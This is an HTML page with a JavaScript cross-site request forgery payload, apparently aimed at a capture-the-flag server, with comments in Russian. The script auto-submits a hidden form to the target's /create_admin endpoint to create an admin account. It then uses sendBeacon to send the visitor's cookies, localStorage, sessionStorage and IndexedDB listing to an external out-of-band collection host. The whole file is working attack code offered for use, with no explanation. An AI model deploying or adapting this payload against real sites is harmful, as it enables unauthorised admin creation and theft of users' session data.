<!DOCTYPE html>
<html>
<body>
<script>
const TARGET = 'https://tasks.goidactf.ru:20431';
const COLLAB = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';

// Создаём админа
const form = document.createElement('form');
form.method = 'POST';
form.action = TARGET + '/create_admin';
form.target = '_blank';
form.innerHTML = '<input name="new_admin_login" value="FLAG_CHECK">';
document.body.appendChild(form);
form.submit();

// Через 2 секунды проверяем что сохранилось
setTimeout(() => {
    // Куки
    navigator.sendBeacon(COLLAB + '/cookies', document.cookie);
    
    // LocalStorage
    try {
        const ls = JSON.stringify(localStorage);
        navigator.sendBeacon(COLLAB + '/localstorage', ls);
    } catch(e) {}
    
    // SessionStorage
    try {
        const ss = JSON.stringify(sessionStorage);
        navigator.sendBeacon(COLLAB + '/sessionstorage', ss);
    } catch(e) {}
    
    // IndexedDB
    if ('indexedDB' in window) {
        indexedDB.databases().then(dbs => {
            navigator.sendBeacon(COLLAB + '/indexeddb', JSON.stringify(dbs));
        });
    }
}, 2000);
</script>
</body>
</html>
